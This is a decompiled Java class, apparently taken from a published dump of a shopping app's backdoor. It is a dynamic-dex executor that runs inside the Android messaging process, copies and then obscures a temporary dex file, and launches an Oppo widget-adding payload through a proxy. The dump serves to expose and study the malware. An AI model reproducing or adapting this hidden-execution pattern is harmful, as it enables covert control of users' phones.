package com.google.android.sd.biz_dynamic_dex.oppoaddwidget;

import android.content.Context;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.OppoProxyExecutor;
import com.google.android.sd.biz_dynamic_dex.oppo_proxy.server.ProguardUtils;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import org.json.JSONObject;

public class OppoAddWidgetExecutor extends DynamicCmdExecutor {
  private static final int CMD = 10;
  
  private boolean dynamicDexValid = false;
  
  protected void preExecute(Context paramContext, String paramString) throws Exception {
    OppoProxyExecutor.onStart(paramContext);
    if ("com.android.mms".equalsIgnoreCase(paramContext.getPackageName())) {
      boolean bool = OppoProxyExecutor.copyFileTempIfNeed(paramContext, paramString);
      this.dynamicDexValid = bool;
      if (bool)
        ProguardUtils.proguardFile(paramContext, 15000L); 
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    try {
    
    } finally {
      paramString = null;
    } 
  }
  
  public boolean work(Context paramContext, String paramString) throws Exception {
    if (TextUtils.isEmpty(paramString)) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(10, "client"), "empty_input", null));
      return false;
    } 
    CmdData cmdData = new CmdData(10, (new JSONObject(paramString)).getString("uuid"), "client", paramString);
    if (!isReadyToExecute(paramContext)) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, "not_ready", null));
      return false;
    } 
    try {
      if (this.dynamicDexValid) {
        (new OppoProxyExecutor("com.google.android.sd.biz_dynamic_dex.oppoaddwidget.OppoAddWidgetBizExecutor", "com.google.android.sd.biz_dynamic_dex.oppoaddwidget.OppoAddWidgetCore", 0)).execute(paramContext, cmdData);
      } else {
        (new OppoAddWidgetBizExecutor()).execute(paramContext, cmdData);
      } 
      return true;
    } catch (Exception exception) {
      return false;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppoaddwidget\OppoAddWidgetExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */